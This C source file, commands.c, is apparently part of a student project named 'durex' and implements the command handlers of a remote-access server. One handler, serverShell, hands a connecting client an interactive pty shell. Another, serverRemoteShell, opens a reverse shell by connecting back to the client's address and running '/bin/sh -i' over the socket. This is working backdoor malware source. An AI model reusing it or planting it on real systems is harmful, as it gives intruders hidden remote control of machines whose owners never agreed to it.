/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   commands.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
/*   Updated: 2018/08/21 10:07:39 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* wait */
#include <wait.h>
/* errno */
#include <errno.h>
/* exit */
#include <stdlib.h>
#include <termios.h>
#include <sys/ioctl.h>

#include "durex.h"

void				serverHelp(t_cl *client, t_cmd *cmds)
{
	serverLog("[CMDS] - %d: Help wanted.", client->fd);
	for (size_t i = 0; cmds[i].name; i++) {
		clientWrite(cmds[i].name, client);
		clientWrite(": ", client);
		clientWrite(cmds[i].def, client);
		clientWrite("\n", client);
	}
	clientWrite("$> ", client);
}

void				serverShell(t_cl *client, t_cmd *cmds)
{
	pid_t			pid;

	(void)cmds;
	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
	clientWrite("Spawning shell...\n", client);
	if (spawnShell(client->shell)) {
		pid = fork();
		if (pid < 0) {
			close(client->shell[0]);
			close(client->shell[1]);
			client->shell[0] = -1;
			client->shell[1] = -1;
			clientWrite("Failed to fork a new shell\n", client);
			clientWrite("$> ", client);
		} else if (pid > 0) {
			close(client->shell[1]); /* Slave pty */
			client->shell[1] = -1;
		} else {
			struct termios	origin;
			struct termios	exclusive;
			char			buff[SERVER_CLIENT_BUFF];
			int				ret;

			close(client->shell[0]); /* Master pty */
			tcgetattr(client->shell[1], &origin);
			cfmakeraw(&exclusive);
			tcsetattr(client->shell[1], TCSANOW, &exclusive);
			dup2(client->shell[1], STDIN_FILENO);
			dup2(client->shell[1], STDOUT_FILENO);
			dup2(client->shell[1], STDERR_FILENO);
			close(client->shell[1]);
			setsid();
			ioctl(0, TIOCSCTTY, 1);
			while ((ret = read(1, buff, SERVER_CLIENT_BUFF)) > 0) {
				buff[ret] = 0;
				char **split = mysplitwhitespaces(buff);
				pid = fork();
				if (pid == 0) {
					execvp(split[0], split);
					exit(-1);
				} else if (pid > 0) {
					waitpid(pid, &ret, 0);
					if (ret == -1)
						exit(0);
				}
				if (split) {
					char **ptr = split;
					while (*ptr)
						free(*ptr++);
					free(split);
				}
			}
		}
	}
}

void				serverRemoteShell(t_cl *client, t_cmd *cmds)
{
	struct addrinfo	*res;
	struct addrinfo	hints;
	struct addrinfo	*tmp;
	int				fd;
	pid_t			pid;

	serverLog("[CMDS] - %d: Reverse Shell wanted.", client->fd);
	clientWrite("Spawning reverse shell...\n", client);
	mymemset(&hints, 0, sizeof(hints));
	hints.ai_flags = AI_PASSIVE;
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_canonname = NULL;
	hints.ai_addr = NULL;
	hints.ai_next = NULL;
	if ((fd = getaddrinfo(client->addr, SERVER_REMOTE_PORT, &hints, &res))) {
		clientWrite("Failed to connect to server.\n", client);
		clientWrite("$> ", client);
		return serverLog("[ERRO] - %s", gai_strerror(fd));
	}
	tmp = res;
	while (tmp != NULL)
	{
		fd = socket(tmp->ai_family, tmp->ai_socktype, tmp->ai_protocol);
		if (fd < 0)
			continue ;
		if (connect(fd, tmp->ai_addr, tmp->ai_addrlen) == 0)
			break ;
		close(fd);
		fd = -1;
		tmp = tmp->ai_next;
	}
	freeaddrinfo(res);
	if (tmp == NULL || fd < 0) {
		clientWrite("No server found.\n", client);
		if (!tmp)
			serverLog("[ERRO] - Failed to connect to %s:%s (No server found)",
					  client->addr, SERVER_REMOTE_PORT);
		else
			serverLog("[ERRO] - %s", strerror(errno));
		clientWrite("$> ", client);
		return ;
	}
	serverLog("[CMDS] - Connection to %s on %s succeeded.", client->addr, SERVER_REMOTE_PORT);
	pid = fork();
	if (pid < 0) {
		clientWrite("Failed to fork a new shell\n", client);
		clientWrite("$> ", client);
	}
	else if (pid > 0)
		serverQuitClient(client, cmds);
	else {
		char		*cmd[3];

		close(client->fd);
		client->fd = -1;
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		cmd[0] = "/bin/sh";
		cmd[1] = "-i";
		cmd[2] = NULL;
		execv(cmd[0], cmd);
		exit(0);
	}
	close(fd);
}

void			serverQuitClient(t_cl *client, t_cmd *cmds)
{
	serverLog("[CMDS] - %d: Client quit.", client->fd);
	close(client->fd);
	client->fd = -1;
	if (client->shell[0] != -1)
		serverQuitClientShell(client);
	(void)cmds;
}

void			serverQuitClientShell(t_cl *client)
{
	serverLog("[CMDS] - %d: Client shell exited.", client->fd);
	close(client->shell[0]);
	client->shell[0] = -1;
	client->shell[1] = -1;
}
